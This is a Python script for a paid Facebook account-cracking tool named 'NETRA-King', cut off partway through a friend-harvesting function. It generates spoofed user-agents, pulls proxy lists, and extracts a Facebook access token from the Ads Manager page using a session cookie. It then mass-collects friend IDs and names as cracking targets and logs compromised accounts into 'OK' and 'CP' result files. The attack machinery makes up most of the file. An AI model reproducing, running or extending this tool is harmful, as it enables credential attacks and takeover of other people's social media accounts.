#os.system("pkg install espeak") 
#-----------------[ NETRA-King ]-------------------# 

import requests,bs4,json,os,sys,random,datetime,time,re 
import urllib3,rich,base64 
from rich.table import Table as me 
from rich.console import Console as sol 
from bs4 import BeautifulSoup as sop 
from concurrent.futures import ThreadPoolExecutor as tred 
from rich.console import Group as gp 
from rich.panel import Panel as nel 
from rich.markdown import Markdown as mark 
from rich.columns import Columns as col 
from rich import pretty 
from rich.text import Text as tekz 
from time import localtime as lt 
pretty.install() 
CON=sol() 
 #------------------[ NETRA-King ]-------------------# 
import os, platform, time, sys 
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ') 
time.sleep(5) 
os.system('clear') 
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY MESSANGER GROUP") 
time.sleep(2) 
os.system(f'xdg-open https://m.me/j/AbZwLw0pc0h4GVNy/') 
#------------------[ NETRA-King ]-------------------# 
#------------------[ USER-AGENT ]-------------------# 
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",] 
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",] 

ugen2=[] 
ugen=[] 
cokbrut=[] 
ses=requests.Session() 
princp=[] 
try: 
    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text 
    open('.prox.txt','w').write(prox) 
except Exception as e: 
    pass 
prox=open('.prox.txt','r').read().splitlines() 
for xd in range(10000): 
    a='Mozilla/5.0 (Symbian/3; Series60/' 
    b=random.randrange(1, 9) 
    c=random.randrange(1, 9) 
    d='Nokia' 
    e=random.randrange(100, 9999) 
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/' 
    g=random.randrange(1, 9) 
    h=random.randrange(1, 4) 
    i=random.randrange(1, 4) 
    j=random.randrange(1, 4) 
    k='Mobile Safari/535.1' 
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}') 
    ugen2.append(uaku) 

    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)' 
    b=random.choice(['6','7','8','9','10','11','12']) 
    c=' en-us; GT-' 
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
    e=random.randrange(1, 999) 
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' 
    h=random.randrange(73,100) 
    i='0' 
    j=random.randrange(4200,4900) 
    k=random.randrange(40,150) 
    l='Mobile Safari/537.36' 
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}' 
    ugen.append(uaku2) 
for x in range(10): 
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S' 
    b=random.randrange(100, 9999) 
    c=random.randrange(100, 9999) 
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
    h=random.randrange(1, 9) 
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/' 
    j=random.randrange(1, 9) 
    k=random.randrange(1, 9) 
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B' 
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}' 
def uaku(): 
    try: 
        ua=open('bbnew.txt','r').read().splitlines() 
        for ub in ua: 
            ugen.append(ub) 
    except: 
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text 
        ua=open('bbnew.txt','w') 
        aa=re.findall('line">(.*?)<',str(a)) 
        for un in aa: 
            ua.write(un+'\n') 
        ua=open('bbnew.txt','r').read().splitlines() 

#------------[ INDICATION ]---------------# 
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[] 
cokbrut=[] 
pwpluss,pwnya=[],[] 



#------------[ NETRA KING- ]--------------# 

P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m'  
O = '\x1b[1;96m' 
N = '\x1b[0m'     
Z = "\033[1;30m" 
sir = '\033[41m\x1b[1;97m' 
x = '\33[m' # DEFAULT 
m = '\x1b[1;91m' #RED + 
k = '\033[93m' # KUNING + 
h = '\x1b[1;92m' # HIJAU + 
hh = '\033[32m' # HIJAU - 
u = '\033[95m' # UNGU 
kk = '\033[33m' # KUNING - 
b = '\33[1;96m' # BIRU - 
p = '\x1b[0;34m' # BIRU + 
asu = random.choice([m,k,h,u,b]) 

###----------[ ANSII COLOR STYLE ]---------- ### 

Z = "\x1b[0;90m"     # Hitam 
M = "\x1b[38;5;196m" # Merah 
H = "\x1b[38;5;46m"  # Hijau 
K = "\x1b[38;5;226m" # Kuning 
B = "\x1b[38;5;44m"  # Biru 
U = "\x1b[0;95m"     # Ungu 
O = "\x1b[0;96m"     # Biru Muda 
P = "\x1b[38;5;231m" # Putih 
J = "\x1b[38;5;208m" # Jingga 
A = "\x1b[38;5;248m" # Abu-Abu 

###----------[ RICH COLOR STYLE ]---------- ### 

Z2 = "[#000000]" # Hitam 
M2 = "[#FF0000]" # Merah 
H2 = "[#00FF00]" # Hijau 
K2 = "[#FFFF00]" # Kuning 
B2 = "[#00C8FF]" # Biru 
U2 = "[#AF00FF]" # Ungu 
N2 = "[#FF00FF]" # Pink 
O2 = "[#00FFFF]" # Biru Muda 
P2 = "[#FFFFFF]" # Putih 
J2 = "[#FF8F00]" # Jingga 
A2 = "[#AAAAAA]" # Abu-Abu 

#--------------------[ CONVERTER-BULAN ]--------------# 

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'} 
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'} 
tgl = datetime.datetime.now().day 
bln = dic[(str(datetime.datetime.now().month))] 
thn = datetime.datetime.now().year 
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt' 
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt' 
date = str(tgl)+'/'+str(bln)+'/'+str(thn) 
ltx = int(lt()[3]) 
if ltx > 12: 
    a = ltx-12 
    tag = "PM" 
else: 
    a = ltx 
    tag = "AM" 
#------------------[ MACHINE-SUPPORT ]---------------# 

def alvino_xy(u): 
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005) 
def clear(): 
    os.system('clear') 
def back(): 
    login() 
def contact(): 
   # os.system('xdg-open https://www.facebook.com/JEEVAN.King.Ok.Bro') 
    back() 
def linex(): 
    print('\033[1;37m') 
def animation(u): 
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01) 
os.system("xdg-open https://m.facebook.com/groups/822430109526151/") 

os.system('clear') 

import getpass 

attemps = 0 

while attemps < 12345677901: 
    username = input(' \033[0;92mEnter Username: ') 
    password = input(' \033[0;93mEnter Password: ') 
    if username == 'NETRA' and password == 'KING': 
        print(' \033[0;92mYou Have Successfully Logged in.') 
        break 

logo ="""  
____  _____  ________  _________  _______          _        
|_   \|_   _||_   __  ||  _   _  ||_   __ \        / \       
  |   \ | |    | |_ \_||_/ | | \_|  | |__) |      / _ \      
  | |\ \| |    |  _| _     | |      |  __ /      / ___ \     
 _| |_\   |_  _| |__/ |   _| |_    _| |  \ \_  _/ /   \ \_   
|_____|\____||________|_ |_____|  |____| |___||____| |____|  
|_  ||_  _| |_   _||_   \|_   _|.' ___  |                    
  | |_/ /     | |    |   \ | | / .'   \_|                    
  |  __'.     | |    | |\ \| | | |   ____                    
 _| |  \ \_  _| |_  _| |_\   |_\ `.___]  |                   
|____||____||_____||_____|\____|`._____.' 
   ¨X©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥¨[ 
   ¨U\33[0;41m        [ WORKING WIFI & MOBILE DATA ]       \033[0;92m¨U 
   ¨^©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥¨a 
   \033[1;97m¨X©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥¨[\033[1;33m  
   ¨U    Author                   ? \33[1;38mNETRAKING]\33[1;38m    ¨U\033[1;31m  
   ¨U    Facebook                 ? NETRA BUDHA ] ¨U  \033[1;97m   
   ¨U    Github                   ? \33[1;38mNetranetra ]  ¨U\33[1;34m    
   ¨U    Whatsapp                 ? 9863558033 ]  ¨U\33[1;35m  
   ¨U    TOOLS                    ? PAID ]        ¨U \33[1;32m    
   ¨U    VERSION                  ? 9.7 ]         ¨U\033[1;35m  
   \033[1;97m¨^©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥¨a\033[1;31m""" 
os.system('clear') 
print(logo) 
os.system('espeak -a 300 " Your,   Real,  Name,"') 
uname =input('\033[1;97m[\033[1;92m?\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m') 
os.system('espeak -a 300 " Welcome,   to,  NETRA,  King,  Tools"') 
pass 


def login(): 
    try: 
        token = open('.token.txt','r').read() 
        cok = open('.cok.txt','r').read() 
        tokenku.append(token) 
        try: 
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok}) 
            sy2 = json.loads(sy.text)['name'] 
            sy3 = json.loads(sy.text)['id'] 
            menu(sy2,sy3) 
        except KeyError: 
            login_lagi334() 
        except requests.exceptions.ConnectionError: 
            print('\033[0;97m=================') 
            animation(' [¡Á] NO INTERNET CONNECTION DETECTED') 
            exit() 
    except IOError: 
        login_lagi334() 
def login_lagi334(): 
    try: 
        os.system('clear') 
        print(logo) 
        ses = requests.Session() 
        cookies = {'cookie':cookie} 
        url = 'https://www.facebook.com/adsmanager/manage/campaigns' 
        req = ses.get(url,cookies=cookies) 
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1) 
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set) 
        roq = ses.get(nek,cookies=cookies) 
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1) 
        tokenw = open(".token.txt", "w").write(tok) 
        cokiew = open(".cok.txt", "w").write(cookie) 
      #exit() 
    except Exception as e: 
        os.system("rm -f .token.txt") 
        os.system("rm -f .cok.txt") 
        os.system("python nono.py") 
        exit() 

#------------------[ MENU ]----------------# 
 #===?===# 
class jalan: 
    def __init__(self, z): 
        for e in z + "\n": 
            sys.stdout.write(e) 
            sys.stdout.flush() 
            time.sleep(0.040) 
def menu(): 
    os.system('clear') 
    print(logo) 
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname) 
    print("\033[97;1m[\033[92;1m?\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date) 
    print('\033[0;97m===============================================') 
    print(f"""\033[97;1m[\033[92;1m1\033[97;1m] \033[0;92mFILE CLONING         """) 
    print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;93mCONTACT WITH ADMIN""") 
    print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mCHECK OK IDz   """) 
    print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;91mEXIT""") 
    print('\033[0;97m=================') 
    NETRAKING = input('\x1b[1;92m[+] CHOOSE: ') 
    if NETRAKING in ['111']: 
        login() 
        dump_massal() 
    elif NETRAKING  in ['1']: 
        crack_file() 
    elif NETRAKING  in ['2','02']: 
        os.system('xdg-open https://https://www.facebook.com/profile.php?id=100074362175370') 
        os.system("python nono.py") 
    elif NETRAKING in ['3','03']: 
        result() 
    elif NETRAKING in ['0']: 
        os.system('rm -rf .token.txt') 
        os.system('rm -rf .cookie.txt') 
        print('\033[0;97m=================') 
        animation(' [¡Á] DONE EXIT ') 
        exit() 
    else: 
        print('\033[0;97m=================') 
        animation(' [¡Á] SELECT CORRECTLY ') 
        back() 

    #-----------------[ NETRA-CRACK ]-----------------# 

def result(): 
    os.system('clear') 
    print(logo) 
    print(' \033[97;1m[\033[92;1m1\033[97;1m] CHECK CP IDZ ') 
    print(' \033[97;1m[\033[92;1m2\033[97;1m] CHECK OK IDZ ') 
    print(' \033[97;1m[\033[92;1m3\033[97;1m] EXIT ') 
    print('\033[0;91m==================') 
    kz = input(' \033[97;1m[\033[92;1m?\033[97;1m]CHOOSE : ') 
    if kz in ['1','01']: 
        try:vin = os.listdir('CP') 
        except FileNotFoundError: 
            print('\033[0;91m==================') 
            animation(' \033[97;1m[\033[92;1m?\033[97;1m] FILE NOT FOUND ') 
            time.sleep(3) 
            back() 
        if len(vin)==0: 
            print('\033[0;91m==================') 
            animation(' \033[97;1m[\033[92;1m?\033[97;1m] NO CP RESULTS FOUND ') 
            time.sleep(2) 
            back() 
        else: 
            cih = 0 
            lol = {} 
            for isi in vin: 
                try:hem = open('CP/'+isi,'r').readlines() 
                except:continue 
                cih+=1 
                if cih<10: 
                    nom = ''+str(cih) 
                    lol.update({str(cih):str(isi)}) 
                    lol.update({nom:str(isi)}) 
                    print('\033[0;91m==================') 
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x) 
                else: 
                    lol.update({str(cih):str(isi)}) 
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x) 
            print('\033[0;91m==================') 
            geeh = input(' \033[97;1m[\033[92;1m?\033[97;1m] CHOOSE : ') 
            print('\033[0;91m==================') 
            try:geh = lol[geeh] 
            except KeyError: 
                print('\033[0;91m==================') 
                animation(' \033[97;1m[\033[92;1m?\033[97;1m] NO OPTION FOUND ') 
                exit() 
            try:lin = open('CP/'+geh,'r').read().splitlines() 
            except: 
                print('\033[0;91m==================') 
                animation(' \033[97;1m[\033[92;1m?\033[97;1m] FILE NOT FOUND ') 
                time.sleep(2) 
                back() 
            nocp=0 
            for cpku in range(len(lin)): 
                cpkuni=lin[nocp].split('|') 
                print(f' \033[97;1m[\033[92;1m?\033[97;1m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m') 
                nocp +=1 
            print('\033[0;91m==================') 
            input('\033[97;1m[\033[92;1m?\033[97;1m] PRESS ENTER TO BACK ') 
            back() 
    elif kz in ['2','02']: 
        try:vin = os.listdir('OK') 
        except FileNotFoundError: 
            print('\033[0;91m==================') 
            animation(' \033[97;1m[\033[92;1m?\033[97;1m] FILE NOT FOUND ') 
            time.sleep(2) 
            back() 
        if len(vin)==0: 
            print('\033[0;91m==================') 
            animation(' \033[97;1m[\033[92;1m?\033[97;1m] NO OK RESULTS FOUND ') 
            time.sleep(2) 
            back() 
        else: 
            cih = 0 
            lol = {} 
            for isi in vin: 
                try:hem = open('OK/'+isi,'r').readlines() 
                except:continue 
                cih+=1 
                if cih<100: 
                    print('\033[0;91m==================') 
                    nom = ''+str(cih) 
                    lol.update({str(cih):str(isi)}) 
                    lol.update({nom:str(isi)}) 
                    print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x) 
                else: 
                    lol.update({str(cih):str(isi)}) 
                    print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x) 
            print('\033[0;91m==================') 
            geeh = input(' \x1b[1;92m [?] CHOOSE : ') 
            print('\033[0;91m==================') 
            try:geh = lol[geeh] 
            except KeyError: 
                print('\033[0;91m==================') 
                animation(' \033[97;1m[\033[92;1m?\033[97;1m] NO OPTION FOUND ') 
                exit() 
            try:lin = open('OK/'+geh,'r').read().splitlines() 
            except: 
                print('\033[0;91m==================') 
                animation(' \033[97;1m[\033[92;1m?\033[97;1m] FILE NOT FOUND ') 
                time.sleep(2) 
                back() 
            nocp=0 
            for cpku in range(len(lin)): 
                cpkuni=lin[nocp].split('|') 
                print(f'\033[97;1m[\033[92;1m?\033[97;1m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m') 
                nocp +=1 
            print('\033[0;91m==================') 
            input('\033[97;1m[\033[92;1m?\033[97;1m] PRESS ENTER TO BACK ') 
            back() 
    elif kz in ['0','00']: 
        back() 
    else: 
        print('\033[0;91m==================') 
        animation(' \033[97;1m[\033[92;1m?\033[97;1m] NO OPTION FOUND IN MENU') 
        exit() 

#-------------------[ CRACK-PUBLIK ]----------------# 

def dump_massal(): 
    try: 
        token = open('.token.txt','r').read() 
        cok = open('.cok.txt','r').read() 
    except IOError: 
        exit() 
    try: 
        print('\033[0;91m==================') 
        jum = int(input(' \033[97;1m[\033[92;1m?\033[97;1m] ENTER TARGET AMOUNT  : ')) 
        print('\033[0;91m==================') 
    except ValueError: 
        print('\033[0;91m==================') 
        animation(' [¡Á] INVALID OPTION ') 
        exit() 
    if jum<1 or jum>100000000: 
        print('\033[0;91m==================') 
        animation(' [¡Á] TRY AGAIN ') 
        exit() 
    ses=requests.Session() 
    yz = 0 
    for met in range(jum): 
        yz+=1 
        kl = input(' \033[97;1m[\033[92;1m?\033[97;1m] INPUT UID '+str(yz)+' : ') 
        uid.append(kl) 
    for userr in uid: 
        try: 
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json() 
            for mi in col['friends']['data']: 
                try: 
                    iso = (mi['id']+'|'+mi['name']) 
                    if iso in id:pass 
                    else:id.append(iso) 
                except:continue 
        except (KeyError,IOError): 
            pass 
        except requests.exceptions.ConnectionError: 
            print('\033[0;91m==================') 
         